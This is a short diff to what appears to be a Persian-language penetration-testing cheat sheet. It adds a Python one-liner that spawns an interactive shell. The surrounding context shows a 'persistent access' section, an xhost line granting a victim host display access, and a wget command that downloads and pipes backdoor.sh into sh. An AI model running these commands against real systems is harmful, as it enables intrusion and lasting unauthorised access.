@@ -184,6 +184,12 @@ o Add permission to connect: xhost +victimiP
 wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh
 ```
 
+### spawn شل
+
+```text
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+
 ## دسترسی همیشگی
 
 ### برای لینوکس \(در سیستم مهاجم\)
